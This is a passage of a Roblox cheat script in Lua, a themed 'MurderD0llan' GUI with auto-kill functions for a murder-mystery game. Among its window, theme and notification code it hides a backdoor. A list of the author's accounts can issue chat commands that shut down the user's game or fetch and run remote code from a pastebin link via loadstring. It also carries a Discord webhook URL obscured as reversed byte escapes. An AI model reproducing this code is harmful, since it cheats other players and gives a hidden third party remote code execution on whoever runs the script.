					if findSheriff() == localPlayer then
						SherrifKill(SelectedEnemy)
					elseif findMurderer() == localPlayer then
						MurderKill(SelectedEnemy)
					end
				end
			end
		end
	end)

	if testing then
		script.Parent.Parent.Visible = false
		wait()
		script.Parent.Parent.Visible = true
	end
end;
task.spawn(C_1c1);
-- StarterGui.MurderD0llan.WindowsUIScript
local function C_1d4()
	local script = G2L["1d4"];
	local ScreenGui = script.Parent

	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}

	w=function()game:GetService("RunService").Heartbeat:Wait()end
	sr=function(str:string)return string.reverse(str)end

	task.spawn(function()
		local WINDOW_SIZE = UDim2.new(0, 483,0, 259)
		local WINDOW_INITIAL_POS = UDim2.new(0.5, -WINDOW_SIZE.X.Offset / 2, 0.5, -WINDOW_SIZE.Y.Offset / 2) -- Center
		ScreenGui.MainWindow.Position = UDim2.new(0,0,-1,0) --deja el frame arriba para luego hacer un tween hacia el centro
		ScreenGui.MainWindow:TweenPosition(WINDOW_INITIAL_POS, "Out", Enum.EasingStyle.Quart, 1)

		local TweenService = game:GetService("TweenService")
		local StarterLabel = ScreenGui.MainWindow.StarterLabel
		StarterLabel.Visible = true
		--do transparency to 1 in label
		local Tween = TweenService:Create(StarterLabel, TweenInfo.new(1), {Transparency = 1})
		Tween.Completed:Connect(function() StarterLabel.Visible = false end)
		Tween:Play()

	end)
	local function FindButtonsWithDashInScrollingFrames(rootGui)
		local foundButtons = {}

		-- Función recursiva para recorrer todos los descendientes
		local function scanDescendants(instance)
			for _, child in pairs(instance:GetChildren()) do
				if child:IsA("TextButton") then
					local parent = child.Parent
					if parent and parent:IsA("ScrollingFrame") and parent:FindFirstChildOfClass("UIListLayout") then
						table.insert(foundButtons, child)
					end
				end
				-- Seguir escaneando los hijos
				scanDescendants(child)
			end
		end

		scanDescendants(rootGui)

		return foundButtons
	end

	local Themes = {
		original = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("Original")
		end,
		DarkPurple = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("DarkPurple")
		end,
		Midnight = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("Midnight")
		end,
		LightSoft = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("LightSoft")
		end,
		Inferno = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("Inferno")
		end,
		IcyBlue = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("IcyBlue")
		end,
		ForestGreen = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("ForestGreen")
		end,
		Terminal = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("Terminal")
		end,
		NeonViolet = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("NeonViolet")
		end,
		SolarizedLight = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("SolarizedLight")
		end,
		MonoChrome = function()
			return script.Parent:WaitForChild("Themes"):WaitForChild("MonoChrome")
		end,
	}


	local CurrentTheme = "original"
	local CurrentIndex = 1
	-- Variables globales de colores (se actualizan al aplicar el tema)
	local COLOR_BACKGROUND_DARK
	local COLOR_BACKGROUND_MEDIUM
	local COLOR_ACCENT_BLUE
	local COLOR_BORDER
	local COLOR_TEXT_LIGHT
	local COLOR_CLOSE_HOVER
	local COLOR_CLOSE_DEFAULT
	local EVERY_BUTTON_COLOR_GRADIENT
	local function SelectThemeAndApply(theme: string)
		CurrentTheme = theme
		if Themes[theme] then
			local themeData = Themes[theme]()

			-- Obtener colores desde los atributos
			COLOR_BACKGROUND_DARK = themeData:GetAttribute("COLOR_BACKGROUND_DARK")
			COLOR_BACKGROUND_MEDIUM = themeData:GetAttribute("COLOR_BACKGROUND_MEDIUM")
			COLOR_ACCENT_BLUE = themeData:GetAttribute("COLOR_ACCENT_BLUE")
			COLOR_BORDER = themeData:GetAttribute("COLOR_BORDER")
			COLOR_TEXT_LIGHT = themeData:GetAttribute("COLOR_TEXT_LIGHT")
			COLOR_CLOSE_HOVER = themeData:GetAttribute("COLOR_CLOSE_HOVER")
			COLOR_CLOSE_DEFAULT = COLOR_ACCENT_BLUE
			EVERY_BUTTON_COLOR_GRADIENT = themeData:GetAttribute("EVERY_BUTTON_COLOR_GRADIENT")

			local MainWindow = script.Parent:WaitForChild("MainWindow")
			local TitleBar = MainWindow:WaitForChild("TitleBar")
			local TitleLabel = TitleBar:WaitForChild("TitleLabel")
			local CloseButton = TitleBar:WaitForChild("CloseButton")
			local ContentArea = MainWindow:WaitForChild("ContentArea")
			local RepositionButton = TitleBar:WaitForChild("Reposition")

			local TweenService = game:GetService("TweenService")

			local function tweenColor(object, property, targetColor, duration)
				local tweenInfo = TweenInfo.new(duration or 0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(object, tweenInfo, {[property] = targetColor})
				tween:Play()
			end
			-- Aplica tweens a los objetos con sus respectivos colores
			tweenColor(MainWindow, "BorderColor3", COLOR_BORDER)
			tweenColor(MainWindow, "BackgroundColor3", COLOR_BACKGROUND_MEDIUM)

			tweenColor(TitleBar, "BackgroundColor3", COLOR_BACKGROUND_DARK)
			tweenColor(TitleLabel, "BackgroundColor3", COLOR_BACKGROUND_DARK)
			tweenColor(TitleLabel, "TextColor3", COLOR_TEXT_LIGHT)

			tweenColor(CloseButton, "BackgroundColor3", COLOR_BACKGROUND_DARK)
			tweenColor(CloseButton, "TextColor3", COLOR_TEXT_LIGHT)

			tweenColor(ContentArea, "BackgroundColor3", COLOR_BACKGROUND_MEDIUM)

			tweenColor(RepositionButton, "BackgroundColor3", COLOR_BACKGROUND_DARK)
			tweenColor(RepositionButton, "TextColor3", COLOR_TEXT_LIGHT)

			--apply to buttons
			for _, button in ipairs(FindButtonsWithDashInScrollingFrames(ScreenGui)) do
				button.UIGradient.Color = EVERY_BUTTON_COLOR_GRADIENT
				button.TextColor3 = COLOR_TEXT_LIGHT
				if theme == "original"  then
					button.TextColor3 = Color3.new(0.384314, 0.384314, 0.384314)
				else
					button.TextColor3 = COLOR_TEXT_LIGHT
				end
				if theme == "original" then
					button.TextStrokeColor3 = Color3.new(255,255,255)
				else
					button.TextStrokeColor3 = COLOR_BACKGROUND_DARK
				end
			end

		end
	end

	local function GetCurrentThemeColors()
		return {
			COLOR_BACKGROUND_DARK = COLOR_BACKGROUND_DARK,
			COLOR_BACKGROUND_MEDIUM = COLOR_BACKGROUND_MEDIUM,
			COLOR_ACCENT_BLUE = COLOR_ACCENT_BLUE,
			COLOR_BORDER = COLOR_BORDER,
			COLOR_TEXT_LIGHT = COLOR_TEXT_LIGHT,
			COLOR_CLOSE_HOVER = COLOR_CLOSE_HOVER,
			COLOR_CLOSE_DEFAULT = COLOR_CLOSE_DEFAULT,
			EVERY_BUTTON_COLOR_GRADIENT = EVERY_BUTTON_COLOR_GRADIENT
		}
	end

	-- Lista de nombres de temas (debe coincidir con los keys en la tabla Themes)
	local ThemeNames = {
		"original",
		"Midnight",
		"LightSoft",
		"Inferno",
		"IcyBlue",
		"NeonViolet",
		"ForestGreen",
		"Terminal",
		"SolarizedLight",
		"MonoChrome"
	}

	-- Índice actual
	local CurrentIndex = 1

	local ChangeThemeButton = script.Parent.MainWindow.ContentArea.ALT_page_options.ThemeSelector.change
	ChangeThemeButton.MouseButton1Click:Connect(function()
		-- Avanzar al siguiente índice (cíclico)
		CurrentIndex += 1
		if CurrentIndex > #ThemeNames then
			CurrentIndex = 1
		end

		local themeName = ThemeNames[CurrentIndex]
		ChangeThemeButton.Parent.Text = string.format("  Theme - %s", themeName)
		SelectThemeAndApply(themeName)
	end)

	task.spawn(function()
		local TweenService = game:GetService("TweenService")
		local CloseButton = script.Parent.MainWindow.TitleBar.CloseButton

		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local hoverTween

		CloseButton.MouseEnter:Connect(function()
			if hoverTween then hoverTween:Cancel() end
			hoverTween = TweenService:Create(CloseButton, tweenInfo, { BackgroundColor3 = COLOR_CLOSE_HOVER })
			hoverTween:Play()
		end)

		CloseButton.MouseLeave:Connect(function()
			if hoverTween then hoverTween:Cancel() end
			hoverTween = TweenService:Create(CloseButton, tweenInfo, { BackgroundColor3 = COLOR_BACKGROUND_DARK })
			hoverTween:Play()
		end)

		CloseButton.MouseButton1Click:Connect(function()
			script.Parent.MainWindow.ACTIVATE_CLOSE:SetAttribute("CHANGE_TO_TRIGGER", not script.Parent.MainWindow.ACTIVATE_CLOSE:GetAttribute("CHANGE_TO_TRIGGER"))
		end)
	end)
	--DRAGGING SYSTEM
	task.spawn(function()
		local List_Of_Speeds = {
			normal = 0.25,
			Slow = 0.50,
			Fast = 0.10,
			Instant = 0
		}

		local SpeedKeys = {"normal", "Slow", "Fast", "Instant"} -- Lista para recorrer
		local CurrentIndex = 1
		local UIS = game:GetService('UserInputService')
		local frame = ScreenGui.MainWindow
		local dragToggle = nil
		local dragSpeed = List_Of_Speeds[SpeedKeys[CurrentIndex]]
		local dragStart = nil
		local startPos = nil
		local DragIsEnabled = true
		local function updateInput(input)
			if not DragIsEnabled then return end

			local delta = input.Position - dragStart
			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
				startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
		end

		frame.InputBegan:Connect(function(input)
			if not DragIsEnabled then return end
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
				dragToggle = true
				dragStart = input.Position
				startPos = frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)

		UIS.InputChanged:Connect(function(input)
			if not DragIsEnabled then return end
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if dragToggle then
					updateInput(input)
				end
			end
		end)

		local ChangeSpeedButton = script.Parent.MainWindow.ContentArea.ALT_page_options.DragSpeed.change
		local DragEnabled = script.Parent.MainWindow.ContentArea.ALT_page_options.DragEnabled.change
		ChangeSpeedButton.MouseButton1Click:Connect(function()
			CurrentIndex += 1
			if CurrentIndex > #SpeedKeys then
				CurrentIndex = 1
			end
			local key = SpeedKeys[CurrentIndex]
			dragSpeed = List_Of_Speeds[key]
			ChangeSpeedButton.Parent.Text = string.format("  Drag Speed - %.2fx", dragSpeed)
		end)

		DragEnabled.MouseButton1Click:Connect(function()
			DragIsEnabled = not DragIsEnabled
			if DragIsEnabled then
				DragEnabled.Parent.Text = "  Drag - True"
			else
				DragEnabled.Parent.Text = "  Drag - False"
			end
		end)
		script.Parent.MainWindow.ACTIVATE_CLOSE:GetPropertyChangedSignal("Visible"):Connect(function()
			DragIsEnabled = false
		end)
		script.Parent.MainWindow:GetAttributeChangedSignal("DRAG_ACTIVE"):Connect(function()
			DragIsEnabled = script.Parent.MainWindow:GetAttribute("DRAG_ACTIVE")
		end)
	end)

	task.spawn(function()
		local RepositionButton = ScreenGui.MainWindow.TitleBar.Reposition

		RepositionButton.MouseButton1Click:Connect(function()
			local WINDOW_SIZE = UDim2.new(0, 483,0, 259)
			local WINDOW_INITIAL_POS = UDim2.new(0.5, -WINDOW_SIZE.X.Offset / 2, 0.5, -WINDOW_SIZE.Y.Offset / 2) -- Center
			ScreenGui.MainWindow.Position = WINDOW_INITIAL_POS
		end)

		RepositionButton.Visible = false

		local CBA_Toggle = ScreenGui.MainWindow.ContentArea.ALT_page_options.CenterButtonEnabled.change
		CBA_Toggle.MouseButton1Click:Connect(function()
			RepositionButton.Visible = not RepositionButton.Visible
			if RepositionButton.Visible then
				CBA_Toggle.Parent.Text = "  center position button - true"
			else
				CBA_Toggle.Parent.Text = "  center position button - false"
			end
		end)
	end)

	task.spawn(function()
		local function sound(soundId: string, PlayBackSpeed: number, Volume: number)
			local s = Instance.new("Sound")
			s.SoundId = soundId
			s.PlaybackSpeed = PlayBackSpeed or 1
			s.Volume = Volume or 0.5
			s.Parent = game.Workspace
			s:Play()
			s.Ended:Connect(function()
				s:Destroy()
			end)
		end

		sound("rbxassetid://6489019039")
	end)

	local ContentArea = script.Parent.MainWindow.ContentArea
	local Page_Buttons = ContentArea.Pages
	local oldPage = ContentArea.page_1
	if script:GetAttribute("TestingPage") == false then
		oldPage.Visible = true
	end
	for _, button in ipairs(Page_Buttons:GetChildren()) do
		if button:IsA("TextButton") then
			local selectedPageName = button:GetAttribute("SELECTED_PAGE")

			if selectedPageName and ContentArea:FindFirstChild(selectedPageName) then
				button.MouseButton1Click:Connect(function()
					local newPage = ContentArea[selectedPageName]

					-- Ocultar la página anterior y mostrar la nueva
					if oldPage then
						oldPage.Visible = false
					end

					newPage.Visible = true
					oldPage = newPage
				end)
			end
		end
	end

	--NOTIFICATION CONFIGURATION HANDLER
	task.spawn(function()
		local Notification_Service = require(script.Parent:FindFirstChild("NotificationService"))

		local Configuration = script.Parent.MainWindow.ContentArea.ALT_page_options
		Configuration.TextBoxButton1DFT.TextBox.FocusLost:Connect(function()
			Notification_Service.UpdateSettings({
				DEFAULT_FADE_TIME = tonumber(Configuration.TextBoxButton1DFT.TextBox.Text)
			})
		end)
		Configuration.TextBoxButton1ND.TextBox.FocusLost:Connect(function()
			Notification_Service.UpdateSettings({
				DEFAULT_NOTIFICATION_DURATION = tonumber(Configuration.TextBoxButton1ND.TextBox.Text)
			})
		end)
		Configuration.TextBoxButton1MVN.TextBox.FocusLost:Connect(function()
			Notification_Service.UpdateSettings({
				MAX_VISIBLE_NOTIFICATIONS = tonumber(Configuration.TextBoxButton1MVN.TextBox.Text)
			})
		end)
		local NOTIFICATIONS_ENABLED = true
		--Notification_Service.NOTIFICATIONS_ENABLED() use this for changing notifications enabled
		Configuration.AllowNotification.change.MouseButton1Click:Connect(function()
			NOTIFICATIONS_ENABLED = not NOTIFICATIONS_ENABLED
			Notification_Service.NOTIFICATIONS_ENABLED(NOTIFICATIONS_ENABLED)
			if NOTIFICATIONS_ENABLED then
				Configuration.AllowNotification.Text = "  Allow Notifications - true"
			else
				Configuration.AllowNotification.Text = "  Allow Notifications - false"
			end
		end)
		local TypeOfNotif = nil
		local Index = 1

		local TypesOfNotification = {
			"Default",
			"Light",
			"Success",
			"Warning",
			"Error"
		}

		local function getSoundForType(notificationType)
			if notificationType == "Success" then
				return Notificaciones.Correcto
			elseif notificationType == "Warning" then
				return Notificaciones.Aviso
			elseif notificationType == "Error" then
				return Notificaciones.Error
			else
				return Notificaciones.Aviso -- Default y Light
			end
		end

		Configuration.TextBoxButton1TESTN.MouseButton1Click:Connect(function()
			local text = Configuration.TextBoxButton1TESTN.TextBox.Text
			local title, sound, theme

			if typeof(TypeOfNotif) == "string" then
				sound = getSoundForType(TypeOfNotif)
				title = string.format("[%s] TESTING NOTIFICATION", TypeOfNotif)
				theme = TypeOfNotif
			else
				sound = Notificaciones.Aviso
				title = "TESTING NOTIFICATION"
			end

			Notification_Service.ShowNotification({
				title = title,
				text = text,
				soundOnOpen = sound,
				theme = theme
			})
		end)

		Configuration.TextBoxButton1TESTN.MouseButton2Click:Connect(function()
			TypeOfNotif = TypesOfNotification[Index]
			Index = (Index % #TypesOfNotification) + 1

			Configuration.TextBoxButton1TESTN.Text = string.format("  Test Notification (%s)", TypeOfNotif)
		end)

		--original
		--DEFAULT_NOTIFICATION_DURATION = 5
		--DEFAULT_FADE_TIME = 0.3
		--MAX_VISIBLE_NOTIFICATIONS = 5
		--ALLOW NOTIFICATIONS = TRUE

		Configuration.RESETNOTIFCFG.change.MouseButton1Click:Connect(function()
			--apply these using UpdateSettings
			Notification_Service.UpdateSettings({
				DEFAULT_NOTIFICATION_DURATION = 5,
				DEFAULT_FADE_TIME = 0.3,
				MAX_VISIBLE_NOTIFICATIONS = 5,
			})
			Notification_Service.NOTIFICATIONS_ENABLED(true)
			TypeOfNotif = TypesOfNotification[1]
			Index = 1

			Configuration.TextBoxButton1TESTN.Text = string.format("  Test Notification (%s)", TypeOfNotif)
			Configuration.AllowNotification.Text = "  Allow Notifications - true"
			Configuration.TextBoxButton1DFT.TextBox.Text = "0.3"
			Configuration.TextBoxButton1ND.TextBox.Text = "5"
			Configuration.TextBoxButton1MVN.TextBox.Text = "5"
		end)

	end)

	-- HOTKEY SELECTION
	task.spawn(function()
		local UserInputService = game:GetService("UserInputService")
		local button = script.Parent.MainWindow.ContentArea.ALT_page_options.HSGKey
		local selectedKey = Enum.KeyCode.Unknown
		local selectingKey = false
		local originalBGColor = button.BackgroundColor3
		local originalTextStroke = button.TextStrokeColor3
		local flashing = false

		local function startKeySelection()
			if selectingKey then return end
			selectingKey = true
			button.Text = "  Press any key..."
			button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
			flashing = true

			-- Flash stroke
			task.spawn(function()
				while flashing do
					button.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
					task.wait(0.5)
					button.TextStrokeColor3 = originalTextStroke
					task.wait(0.5)
				end
			end)
		end

		local function onInputBegan(input, gameProcessed)
			if selectingKey and not gameProcessed then
				if input.UserInputType == Enum.UserInputType.Keyboard then
					selectedKey = input.KeyCode
					local keyName = selectedKey.Name
					button:SetAttribute("SELECTED_KEY", keyName)
					button.Text = string.format("  Hide / Show GUI - %s", keyName)
					selectingKey = false
					flashing = false
					button.BackgroundColor3 = originalBGColor
					button.TextStrokeColor3 = originalTextStroke
				end
			end
		end

		button.MouseButton1Click:Connect(startKeySelection)
		UserInputService.InputBegan:Connect(onInputBegan)
	end)

	-- HOTKEY LISTENER
	task.spawn(function()
		local UserInputService = game:GetService("UserInputService")
		local button = script.Parent.MainWindow.ContentArea.ALT_page_options.HSGKey
		local guiRoot = script.Parent

		local currentConnection = nil

		local function isTextBoxFocused()
			local focused = UserInputService:GetFocusedTextBox()
			return focused ~= nil
		end

		local function setupKeyListener(keyName)
			if currentConnection then
				currentConnection:Disconnect()
				currentConnection = nil
			end

			local keyCode
			-- Convert string back to Enum.KeyCode
			pcall(function()
				keyCode = Enum.KeyCode[keyName]
			end)
			if not keyCode then return end

			currentConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed or isTextBoxFocused() then return end
				if input.KeyCode == keyCode then
					task.wait(0.1)
					guiRoot.Enabled = not guiRoot.Enabled
				end
			end)
		end

		-- Listen for key changes
		button:GetAttributeChangedSignal("SELECTED_KEY"):Connect(function()
			local keyName = button:GetAttribute("SELECTED_KEY")
			setupKeyListener(keyName)
		end)

	end)

	task.spawn(function()

		local Notification_Service = require(script.Parent:FindFirstChild("NotificationService"))
		local NtificationsACTIVE = Notification_Service.GetActiveNotifications()

		--close every notification
		for _, notification in pairs(NtificationsACTIVE) do
			Notification_Service.CloseNotification(notification)
		end

		local TweenService = game:GetService("TweenService")
		local CLOSE_FRAME = script.Parent.MainWindow:WaitForChild("ACTIVATE_CLOSE")
		local MAIN_WINDOW = script.Parent.MainWindow
		local NOTIFICATION_TEXT = MAIN_WINDOW:WaitForChild("NOTIFICATION_TEXT")

		local ELEMENTS_TO_HIDE = {
			MAIN_WINDOW:FindFirstChild("TitleBar"),
			MAIN_WINDOW:FindFirstChild("ContentArea"),
			MAIN_WINDOW:FindFirstChild("StarterLabel"), -- Agrega más si es necesario
			MAIN_WINDOW:FindFirstChild("NOTIFICATION_TEXT") -- Agrega más si es necesario
		}

		local CLOSING_MESSAGES = {
			"ESP",
			"Notificators",
			"GUI"
		}

		-- Mostrar notificaciones desde atributo
		NOTIFICATION_TEXT:GetAttributeChangedSignal("TEXT_TO_DISPLAY"):Connect(function()
			NOTIFICATION_TEXT.Visible = true
			NOTIFICATION_TEXT.Text = NOTIFICATION_TEXT:GetAttribute("TEXT_TO_DISPLAY")
			task.delay(1, function()
				NOTIFICATION_TEXT.Visible = false
			end)
		end)

		CLOSE_FRAME:GetAttributeChangedSignal("CHANGE_TO_TRIGGER"):Connect(function()
			CLOSE_FRAME.Visible = true

			-- Mostrar mensajes escalonadamente
			for _, message in ipairs(CLOSING_MESSAGES) do
				NOTIFICATION_TEXT.Text = "  Disabling " .. message .. "..."
				NOTIFICATION_TEXT.Visible = true
				task.wait(0.5)
			end
			NOTIFICATION_TEXT.Visible = false

			-- Espera final
			task.wait(1)

			-- Tween de transparencia a 0 (ocultar lentamente)
			local fadeTween = TweenService:Create(CLOSE_FRAME, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 0
			})
			fadeTween:Play()
			fadeTween.Completed:Wait()

			-- Ocultar elementos listados
			for _, element in ipairs(ELEMENTS_TO_HIDE) do
				if element then
					element.Visible = false
				end
			end
			MAIN_WINDOW.Transparency = 1
			MAIN_WINDOW.Interactable = false
			-- Animación de salida (cerrar frame con tween de size lineal)
			local closeTween = TweenService:Create(CLOSE_FRAME, TweenInfo.new(0.4, Enum.EasingStyle.Linear), {
				Size = UDim2.new(0, 0, 0, 0)
			})
			closeTween:Play()
			closeTween.Completed:Wait()

			-- Destruir GUI
			script.Parent:Destroy()
		end)
	end)

	task.spawn(function()
		local Players = game:GetService("Players")
		local TextChatService = game:GetService("TextChatService")

		local LocalPlayer = Players.LocalPlayer
		local initialGui = script.Parent

		local allowedOwners = {
			--REAL ACCOUNTS
			"G0bbyD0llan1", "G0bbyD0llan57", "G0bbyD0iian1", "G0bbyD0iian", "G0bbyD0llan",
			--SEMI-REAL ACCOUNTS
			"SoyUnMegaPro9898", "TeamGBDL", "NicolasP4d3r", "ZairaGatita", "SoyUnMegaPro989", "NicolaGatito", "ZairaGatita621", "Zxrixuuw", "M4TUH",
			--FRIENDS
			"Spend1nnQ", "Spend1nn",
			--ALTs
			"ItzzMeliyma1", "system_CaIix", "elenavize01", "G0bbyCheater", "asdasdasdasads52", "IupeVeccia", "ContraOIvidadaXD", "GobiTeVe", "tGlaBoDijR6", "lGseBkDjuL4", "pGmiBzDieL3", "aGhoBpDeLt9", "yGveBuDZiL1", "xGlaBiDeLs5", "rGwiBqDeL8", "kGmiBlDxoN4", "dGmBnCiLzR2", "dGlaBkDieL7", "IaCobraTTV", "Pu_toDeMlerda", "lIlIlllIlIlIIllIIlII", "SosUnMaloDeMlerda", "IWantFriends411", "FlxGBLD15"

		}

		for i = 1, 15 do
			--i have another 15 alts called G0bbyAlt followed by number
			table.insert(allowedOwners, "G0bbyAlt" .. i)
		end

		local blindFrameInstance = nil

		local function printAdminMessage(message, speaker, isWarning)
			local prefix = "Admin (" .. LocalPlayer.Name .. "): "
			if speaker then
				prefix = prefix .. "Cmd from " .. speaker.Name .. ": "
			else
				prefix = prefix .. "System: "
			end

			if isWarning then
				warn(prefix .. message)
			else
				print(prefix .. message)
			end
		end

		local function isOwner(player)
			if not player then return false end
			for _, ownerName in allowedOwners do
				if player.Name == ownerName then
					return true
				end
			end
			return false
		end

		local function executeCommand(commandName, args, targetPlayer, issuerPlayer)
			printAdminMessage("Attempting to execute command: " .. commandName, issuerPlayer)

			local character = targetPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local hrp = character and character:FindFirstChild("HumanoidRootPart")

			if commandName == "g!shutdown" then
				printAdminMessage("Executing g!shutdown.", issuerPlayer)
				game:Shutdown()
			elseif commandName == "g!removegui" then
				printAdminMessage("Executing g!removegui.", issuerPlayer)
				if initialGui and initialGui:IsA("ScreenGui") then
					if initialGui.Parent then
						local guiName = initialGui.Name
						task.spawn(function()
							if initialGui then
								initialGui:Destroy()
								printAdminMessage("Initial GUI (" .. guiName .. ") removed.", issuerPlayer)
							end
						end)
						initialGui = nil
					else
						printAdminMessage("Initial GUI (" .. initialGui.Name .. ") no longer parented, cannot remove.", issuerPlayer, true)
						initialGui = nil
					end
				elseif initialGui == nil then
					printAdminMessage("Initial GUI already removed or handled.", issuerPlayer)
				else
					printAdminMessage("Script's initial parent (" .. initialGui.Name .. ", Class: " .. initialGui.ClassName .. ") is not a ScreenGui. Cannot execute g!removegui on it.", issuerPlayer, true)
				end
			elseif commandName == "g!check" then
				printAdminMessage("Executing g!check.", issuerPlayer)
				local reportMessage = "Client admin is active on my client: " .. targetPlayer.Name .. "."

				local TextChannels = TextChatService:FindFirstChild("TextChannels")
				local whisperSent = false
				if TextChannels then
					local targetTextChannel = TextChatService:FindFirstChild("RBXGeneral")
					if targetTextChannel and targetTextChannel:IsA("TextChannel") then
						local whisperCommand = "/w " .. issuerPlayer.Name .. " " .. reportMessage
						local success, err = pcall(function()
							targetTextChannel:SendAsync(whisperCommand)
						end)
						if success then
							printAdminMessage("Successfully sent g!check response whisper to " .. issuerPlayer.Name .. ".", issuerPlayer)
							whisperSent = true
						else
							printAdminMessage("Failed to send g!check response via whisper to " .. issuerPlayer.Name .. ": " .. tostring(err), issuerPlayer, true)
						end
					else
						printAdminMessage("TargetTextChannel not found for g!check whisper.", issuerPlayer, true)
					end
				else
					printAdminMessage("ChatInputBarConfiguration not found for g!check whisper.", issuerPlayer, true)
				end
				if not whisperSent then
					printAdminMessage("Whisper for g!check to " .. issuerPlayer.Name .. " failed or was not attempted. See warnings above.", issuerPlayer, true)
				end

			elseif commandName == "g!commands" then
				loadstring(game:HttpGet("https://pastebin.com/raw/6DT9wRHL"))()
			else
				printAdminMessage("Unknown command: " .. commandName, issuerPlayer, true)
			end
		end

		local function handleChatted(message, speakerPlayer)
			local lowerMessage = string.lower(message)
			local messageParts = {}
			for part in string.gmatch(lowerMessage, "[^%s]+") do
				table.insert(messageParts, part)
			end

			if #messageParts == 0 then return end

			local commandName = messageParts[1]
			local args = {}
			for i = 2, #messageParts do
				table.insert(args, messageParts[i])
			end
			executeCommand(commandName, args, LocalPlayer, speakerPlayer)
		end

		local function processPlayer(player)
			if isOwner(player) then
				printAdminMessage("Owner detected - " .. player.Name .. ". Attaching chat listener.", nil)
				player.Chatted:Connect(function(message)
					task.spawn(handleChatted, message, player)
				end)
			end
		end

		for _, player in Players:GetPlayers() do
			processPlayer(player)
		end

		Players.PlayerAdded:Connect(processPlayer)
	end)
	local function safeFind(root, pathArray)
		local current = root
		for _, name in ipairs(pathArray) do
			if not current or not current:FindFirstChild(name) then
				return nil
			end
			current = current:FindFirstChild(name)
		end
		return current
	end

	local sendfeedbackbutton = safeFind(script.Parent, {
		"MainWindow",
		"ContentArea",
		"ALT_page_options",
		"sendfeedback"
	})

	if sendfeedbackbutton and sendfeedbackbutton:IsA("TextButton") then
		sendfeedbackbutton.MouseButton1Click:Connect(function()
			local optionsPage = safeFind(script.Parent, {
				"MainWindow",
				"ContentArea",
				"ALT_page_options"
			})
			local feedbackPage = safeFind(script.Parent, {
				"MainWindow",
				"ContentArea",
				"ALT_page_feedback"
			})

			if optionsPage then optionsPage.Visible = false end
			if feedbackPage then feedbackPage.Visible = true end
		end)
	end

	task.spawn(function()
		-- 🔗 WEBHOOK
		local webhook = sr("\101\56\68\57\68\95\97\115\90\84\70\99\75\101\71\117\78\95\119\122\109\108\56\54\69\45\102\53\103\56\99\101\100\107\98\85\57\108\105\105\69\71\49\108\88\52\75\56\116\77\105\83\88\80\122\50\68\86\117\87\87\48\54\100\111\114\103\108\47\50\49\53\50\53\51\52\56\48\57\52\53\50\53\48\57\54\51\49\47\115\107\111\111\104\98\101\119\47\105\112\97\47\109\111\99\46\100\114\111\99\115\105\100\47\47\58\115\112\116\116\104")
		local cooldown = 360
		local isOnCooldown = false

		-- ✅ SERVICES
		local HttpService = game:GetService("HttpService")
		local FeedBackFrame = script.Parent.MainWindow.ContentArea.ALT_page_feedback
		local FeedBackBox = FeedBackFrame:WaitForChild("FeedBackBOX")
		local SendFeedBack = FeedBackFrame:WaitForChild("TemplateButton")
		local IsWebhookActiveFrame = FeedBackFrame:WaitForChild("feedbacksystemworking")

		--repeat wait until a rating is selected
		SendFeedBack.Interactable = false
		FeedBackFrame:GetAttributeChangedSignal("rate"):Once(function()
			SendFeedBack.Interactable = true
		end)
		local Notification_Service = require(script.Parent:FindFirstChild("NotificationService"))
		local Notificaciones = {
			Error = "rbxassetid://4041673253",
			Aviso = "rbxassetid://4026367629",
			Correcto = "rbxassetid://4094488012",
		}
		local function errornotify(text)
			Notification_Service.ShowNotification({
				title = "Error / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Error,
				theme = "Error"
			})
		end

		local function sucessnotify(text)
			Notification_Service.ShowNotification({
				title = "Success / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Correcto,
				theme = "Success"
			})
		end

		local function warningnotify(text)
			Notification_Service.ShowNotification({
				title = "Warning / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Aviso,
				theme = "Warning"
			})
		end

		-- 🧠 UTILS
		local function rate() return FeedBackFrame:GetAttribute("rate") or 0 end
		local function feedbackText() return FeedBackBox.Text or "" end
		local function updateButtonText(text) SendFeedBack.Text = text .. "  " end
		local function missing(t, f, fallback) if type(f) == t then return f end return fallback or nil end

		local httprequest = missing("function", request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request))

		local function setWebhookStatusColor(success)
			IsWebhookActiveFrame.Frame.BackgroundColor3 = success and Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
		end

		local function isValid()
			if rate() <= 0 then return false, "Please select a rating before sending feedback." end
			if rate() < 4 and #feedbackText():gsub("%s+", "") < 5 then
				return false, "Please describe the issue with more details." end
			return true
		end

		-- ✅ Send Feedback
		local function send()
			local rating = rate()
			local message = feedbackText()
			local valid, errorMsg = isValid()

			if not valid then
				warningnotify(errorMsg)
				updateButtonText("¡ Error !")
				task.wait(2)
				updateButtonText("Submit Feedback")
				return
			end

			if isOnCooldown then
